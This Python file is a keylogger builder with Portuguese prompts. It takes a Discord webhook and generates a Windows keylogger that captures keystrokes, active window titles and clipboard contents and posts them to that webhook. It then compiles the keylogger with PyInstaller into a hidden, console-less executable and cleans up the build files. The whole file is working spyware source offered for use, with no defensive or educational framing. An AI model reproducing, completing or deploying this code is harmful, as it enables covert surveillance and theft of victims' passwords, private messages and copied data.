import os
import sys
import subprocess
import shutil
import time
from colorama import init, Fore, Style
from pystyle import Colorate, Colors, Center

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def keylogger():
    while True:
        clear()
        keylogger_logo = '''
                           ,--.
                          {    }
                          K,   }
                         /  `Y`
                    _   /   /
                   {_'-K.__/
                     `/-.__L._
                     /  ' /`_}_ 
                    /  ' /     
            ____   /  ' /
     ,-'~~~~    ~~/  ' /_
   ,'             ``~~~%%',
  (                     %  Y
  {                      %% I
{      -                 %  `.
|       ',                %  )
|        |   ,..__      __. Y
|    .,_./  Y ' / ^Y   J   )|
\           |' /   |   |   ||
 \          L_/    . _ (_,.'(
  \,   ,      ^^""' / |      )
    \_  \          /,L]     /
      '-_`-,       ` `   ./`
         `-(_            )
             ^^\..___,.--`
'''
        colored_logo = Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(keylogger_logo))
        print(colored_logo)

        webhook = input(f"\n{Fore.BLUE}└─➔ Insira o Webhook do discord: {Fore.BLUE}").strip()

        if webhook.startswith("https://discordapp.com/api/webhooks/") or webhook.startswith("https://discord.com/api/webhooks/"):
            break
        else:
            print(f"{Fore.BLUE}Webhook Invalida{Style.RESET_ALL}")
            time.sleep(3)

    keylogger_code = f'''
import os
import time
import threading
import requests
import win32clipboard
import win32gui
from pynput import keyboard

WEBHOOK_URL = "{webhook}"
keystroke_buffer = []
last_window = ""
lock = threading.Lock()

def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

def send_embed_to_discord(text, window_title):
    if not text.strip():
        return
    embed = {{
        "title": f"Keystrokes in {{window_title}}",
        "description": text,
        "color": 0x0000FF,
        "footer": {{"text": f"Captured at {{time.strftime('%Y-%m-%d %H:%M:%S')}}" }}
    }}
    data = {{"embeds": [embed]}}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

def on_press(key):
    global keystroke_buffer, last_window
    try:
        k = key.char if hasattr(key, 'char') and key.char else ''
    except:
        k = ''

    window = get_active_window_title()
    with lock:
        global last_window
        if window != last_window:
            last_window = window
            send_embed_to_discord(f"Window switched: {{window}}", window)

        if key == keyboard.Key.space or key == keyboard.Key.enter:
            text = ''.join(keystroke_buffer)
            if text:
                send_embed_to_discord(text + (" [ENTER]" if key == keyboard.Key.enter else ""), window)
            keystroke_buffer.clear()
        elif key == keyboard.Key.backspace:
            if keystroke_buffer:
                keystroke_buffer.pop()
        elif k:
            keystroke_buffer.append(k)

def on_release(key):
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        try:
            win32clipboard.OpenClipboard()
            clip = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            send_embed_to_discord(f"Clipboard copied:\\n{{clip}}", "Clipboard")
        except:
            pass

def start_listener():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()
    while True:
        time.sleep(10)
'''

    downloads = os.path.join(os.path.expanduser("~"), "Downloads")
    script_path = os.path.join(downloads, "built_keylogger.py")

    try:
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(keylogger_code)
        print(f"{Fore.BLUE}✅ Script keylogger criado em: {script_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.BLUE}Erro ao criar o script: {e}{Style.RESET_ALL}")
        time.sleep(3)
        return

    print(f"{Fore.BLUE}Construindo executável...{Style.RESET_ALL}")

    original_dir = os.getcwd()
    os.chdir(downloads)

    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--name", "keylogger_built",
        script_path
    ]

    try:
        subprocess.run(pyinstaller_cmd, check=True)
        print(f"{Fore.BLUE}✅ Keylogger criado com sucesso!{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📁 Local: {downloads}\\keylogger_built.exe{Style.RESET_ALL}")
        print(f"{Fore.BLUE}🔒 Nome: keylogger_built.exe{Style.RESET_ALL}")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.BLUE}Erro no PyInstaller: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.BLUE}Erro inesperado: {e}{Style.RESET_ALL}")
    finally:
        os.chdir(original_dir)

    for folder in ["build", "dist", "__pycache__"]:
        folder_path = os.path.join(downloads, folder)
        if os.path.exists(folder_path):
            try:
                shutil.rmtree(folder_path)
                print(f"{Fore.BLUE}Limpando pasta: {folder}{Style.RESET_ALL}")
            except:
                pass
    
    spec_file = os.path.join(downloads, "keylogger_built.spec")
    if os.path.exists(spec_file):
        try:
            os.remove(spec_file)
            print(f"{Fore.BLUE}Limpando arquivo: keylogger_built.spec{Style.RESET_ALL}")
        except:
            pass

    print(f"\n{Fore.BLUE}✅ Processo finalizado!{Style.RESET_ALL}")
    input(f"{Fore.BLUE}Pressione Enter para sair{Style.RESET_ALL}")

if __name__ == "__main__":
    keylogger()